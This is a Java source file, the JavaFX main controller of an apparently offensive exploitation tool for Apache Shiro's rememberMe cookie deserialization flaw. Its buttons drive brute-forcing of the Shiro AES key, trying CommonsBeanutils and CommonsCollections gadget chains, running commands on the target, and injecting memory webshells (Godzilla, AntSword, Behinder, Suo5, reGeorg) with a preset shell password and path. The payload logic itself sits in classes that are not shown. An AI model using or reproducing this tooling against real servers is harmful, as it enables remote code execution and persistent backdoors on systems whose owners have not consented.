package com.summersec.attack.UI;

import com.summersec.attack.Encrypt.KeyGenerator;
import com.summersec.attack.core.AttackService;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.utils.Utils;
import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.URL;
import java.net.Proxy.Type;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.ResourceBundle;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Window;

public class MainController {
    @FXML
    private ResourceBundle resources;
    @FXML
    private URL location;
    @FXML
    private MenuItem proxySetupBtn;
    @FXML
    private ComboBox<String> methodOpt;
    @FXML
    private TextField globalHeader;
    @FXML
    private TextField post_data;
    @FXML
    private TextField shiroKeyWord;
    @FXML
    private TextField targetAddress;
    @FXML
    private TextField httpTimeout;
    @FXML
    public TextField shiroKey;
    @FXML
    private CheckBox aesGcmOpt;
    @FXML
    private Button crackKeyBtn;
    @FXML
    private Button crackSpcKeyBtn;
    @FXML
    public ComboBox<String> gadgetOpt;
    @FXML
    public ComboBox<String> echoOpt;
    @FXML
    private Button crackGadgetBtn;
    @FXML
    private Button crackSpcGadgetBtn;
    @FXML
    public TextArea logTextArea;
    @FXML
    private Label proxyStatusLabel;
    public static Map currentProxy = new HashMap();
    public AttackService attackService = null;
    @FXML
    private TextField exCommandText;
    @FXML
    public TextArea execOutputArea;
    @FXML
    private Button executeCmdBtn;
    @FXML
    public ComboBox<String> memShellOpt;
    @FXML
    private TextField shellPathText;
    @FXML
    private TextField shellPassText;
    @FXML
    private Button injectShellBtn;
    @FXML
    public TextArea InjOutputArea;
    @FXML
    public TextArea keytxt;
    @FXML
    public Button keygen;

    public MainController() {
    }

    @FXML
    void injectShellBtn(ActionEvent event) {
        String memShellType = (String)this.memShellOpt.getValue();
        String shellPass = this.shellPassText.getText();
        String shellPath = this.shellPathText.getText();
        if (AttackService.gadget != null ) {
            this.attackService.injectMem(memShellType, shellPass, shellPath);
        } else {
            this.InjOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
        }

    }

    @FXML
    void executeCmdBtn(ActionEvent event) {
//        String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
        if (AttackService.attackRememberMe != null) {
            String command = this.exCommandText.getText();
            if (!command.equals("")) {
                this.attackService.execCmdTask(command);
            } else {
                this.execOutputArea.appendText(Utils.log("请先输入获取的命令"));
            }
        } else {
            this.execOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
        }

    }

    @FXML
    void crackSpcGadgetBtn(ActionEvent event) {
        String spcShiroKey = this.shiroKey.getText();
        if (this.attackService == null) {
            this.initAttack();
        }
        if (!spcShiroKey.equals("")) {
            boolean flag = this.attackService.gadgetCrack((String)this.gadgetOpt.getValue(), (String)this.echoOpt.getValue(), spcShiroKey);
            if (!flag) {
                this.logTextArea.appendText(Utils.log("未找到构造链"));
            }
        } else {
            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
        }

    }

    @FXML
    void crackGadgetBtn(ActionEvent event) {
        String spcShiroKey = this.shiroKey.getText();
        if (this.attackService == null) {
            this.initAttack();
        }

        boolean flag = false;
        if (!spcShiroKey.equals("")) {
            List<String> targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());

            for(int i = 0; i < targets.size(); ++i) {
                String[] t = ((String)targets.get(i)).split(":");
                String gadget = t[0];
                String echo = t[1];
                flag = this.attackService.gadgetCrack(gadget, echo, spcShiroKey);
                if (flag) {
                    break;
                }
            }
        } else {
            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
        }

        if (!flag) {
            this.logTextArea.appendText(Utils.log("未找到构造链"));
        }

    }

    @FXML
    void crackSpcKeyBtn(ActionEvent event) {
        this.initAttack();
        if (this.attackService.checkIsShiro()) {
            String spcShiroKey = this.shiroKey.getText();
            if (!spcShiroKey.equals("")) {
                this.attackService.simpleKeyCrack(spcShiroKey);
            } else {
                this.logTextArea.appendText(Utils.log("请输入指定密钥"));
            }
        }

    }

    @FXML
    void crackKeyBtn(ActionEvent event) {
        this.initAttack();
        if (this.attackService.checkIsShiro()) {
            this.attackService.keysCrack();
        }

    }

    @FXML
    void initialize() {
        this.initToolbar();
        this.initComBoBox();
        this.initContext();
        ControllersFactory.controllers.put(MainController.class.getSimpleName(), this);
    }

    public void initAttack() {
        String shiroKeyWordText = this.shiroKeyWord.getText();
        String targetAddressText = this.targetAddress.getText();
        String httpTimeoutText = this.httpTimeout.getText();
        //自定义请求头
        Map<String, String> myheader= new HashMap<>() ;
        if(!this.globalHeader.getText().equals("")) {
            String headers[] = this.globalHeader.getText().split("&&&");
//        myheader(this.globalHeader.getText() -> this.globalHeader.getText().split(":"))
            for (int i = 0; i < headers.length; i++ ) {
                String header[] = headers[i].split(":", 2);
                if (header[0].toLowerCase().equals("cookie")) {
                    myheader.put("Cookie", header[1]);
                } else {
                    myheader.put(header[0], header[1]);
                }
            }
        }
//        this.globalHeader = myheader
        String postData = (String)this.post_data.getText();
        String reqMethod = (String)this.methodOpt.getValue();
        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText,myheader,postData);
        if (this.aesGcmOpt.isSelected()) {
            AttackService.aesGcmCipherType = 1;
        } else {
            AttackService.aesGcmCipherType = 0;
        }

    }

    public void initContext() {
        this.shiroKeyWord.setText("rememberMe");
        this.httpTimeout.setText("10");
    }

    public void initComBoBox() {
//        ObservableList<String> methods = FXCollections.observableArrayList(new String[]{"GET", "POST","复杂请求"});
        ObservableList<String> methods = FXCollections.observableArrayList(new String[]{"GET", "POST"});
        this.methodOpt.setPromptText("GET");
        this.methodOpt.setValue("GET");
        this.methodOpt.setItems(methods);
        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1","CommonsBeanutils1_183", "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsString_183", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsAttrCompare_183", "CommonsBeanutilsPropertySource","CommonsBeanutilsPropertySource_183", "CommonsBeanutilsObjectToStringComparator", "CommonsBeanutilsObjectToStringComparator_183"});
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1" ,"CommonsBeanutils1_183" ,"CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
        this.gadgetOpt.setPromptText("CommonsBeanutilsString");
        this.gadgetOpt.setValue("CommonsBeanutilsString");
        this.gadgetOpt.setItems(gadgets);
        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "SpringEcho"});
//        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "TomcatEcho2", "SpringEcho"});
        this.echoOpt.setPromptText("TomcatEcho");
        this.echoOpt.setValue("TomcatEcho");
        this.echoOpt.setItems(echoes);
        this.shellPassText.setText("pass1024");
        this.shellPathText.setText("/favicondemo.ico");
        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Filter]", "蚁剑[Filter]", "冰蝎[Filter]", "Suo5[Filter]", "NeoreGeorg[Filter]", "reGeorg[Filter]", "哥斯拉[Servlet]", "蚁剑[Servlet]", "冰蝎[Servlet]", "Suo5[Servlet]","NeoreGeorg[Servlet]", "reGeorg[Servlet]", "哥斯拉[Valve]", "冰蝎[Valve]", "Suo5[Valve]", "哥斯拉[Listener]", "冰蝎[Listener]", "Suo5[Listener]", "ChangeShiroKey[Filter]", "ChangeShiroKey[Filter2]", "BastionFilter", "BastionEncryFilter", "AddDllFilter"});
//        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Servlet]", "冰蝎[Servlet]", "蚁剑[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]"});
        this.memShellOpt.setPromptText("冰蝎[Filter]");
        this.memShellOpt.setValue("冰蝎[Filter]");
        this.memShellOpt.setItems(memShells);
        this.memShellOpt.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
            @Override
            public void changed(ObservableValue<? extends Number> observableValue, Number number, Number number2) {
                if (((String)memShells.get(number2.intValue())).contains("reGeorg")  ) {
                    MainController.this.shellPassText.setDisable(true);
                } else {
                    MainController.this.shellPassText.setDisable(false);
                }
                if (((String)memShells.get(number2.intValue())).contains("Valve") || ((String)memShells.get(number2.intValue())).contains("Listener")) {
                    MainController.this.shellPathText.setDisable(true);
                } else {
                    MainController.this.shellPathText.setDisable(false);
                }
                if (((String)memShells.get(number2.intValue())).contains("ChangeShiroKey")){
//                    MainController.this.
                    MainController.this.shellPathText.setDisable(true);
                    MainController.this.shellPassText.setText("FcoRsBKe9XB3zOHbxTG0Lw==");
                }else {
                    MainController.this.shellPathText.setDisable(false);
                }

            }
        });
        this.shellPathText.setText("/favicondemo.ico");
    }

    private void initToolbar() {
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(AlertType.NONE);
            inputDialog.setResizable(true);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型：");
            ComboBox<String> typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField();
            IPText.setText("127.0.0.1");
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField();
            PortText.setText("8080");
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);
            if (currentProxy.get("proxy") != null) {
                Proxy currProxy = (Proxy)currentProxy.get("proxy");
                String proxyInfo = currProxy.address().toString();
                String[] info = proxyInfo.split(":");
                String hisIpAddress = info[0].replace("/", "");
                String hisPort = info[1];
                IPText.setText(hisIpAddress);
                PortText.setText(hisPort);
                enableRadio.setSelected(true);
                System.out.println(proxyInfo);
            } else {
                enableRadio.setSelected(false);
            }

            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    currentProxy.put("proxy", (Object)null);
                    this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {
                    String type;
                    String ipAddress;
                    if (!userNameText.getText().trim().equals("")) {
                        ipAddress = userNameText.getText().trim();
                        type = passwordText.getText();
                        String finalIpAddress = ipAddress;
                        String finalType = type;
                        Authenticator.setDefault(new Authenticator() {
                            @Override
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(finalIpAddress, finalType.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault((Authenticator)null);
                    }

                    currentProxy.put("username", userNameText.getText());
                    currentProxy.put("password", passwordText.getText());
                    ipAddress = IPText.getText();
                    String port = PortText.getText();
                    InetSocketAddress proxyAddr = new InetSocketAddress(ipAddress, Integer.parseInt(port));
                    type = ((String)typeCombo.getValue()).toString();
                    Proxy proxy;
                    if (type.equals("HTTP")) {
                        proxy = new Proxy(Type.HTTP, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    } else if (type.equals("SOCKS")) {
                        proxy = new Proxy(Type.SOCKS, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    }

                    this.proxyStatusLabel.setText("代理生效中: " + ipAddress + ":" + port);
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }

            });
            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });
    }

    @FXML
    void Keytxt(ActionEvent actionEvent) {
        KeyGenerator keyGenerator = new KeyGenerator();
        String key = keyGenerator.getKey();
        this.keytxt.appendText(key);
        this.keytxt.appendText("\n");
    }
}
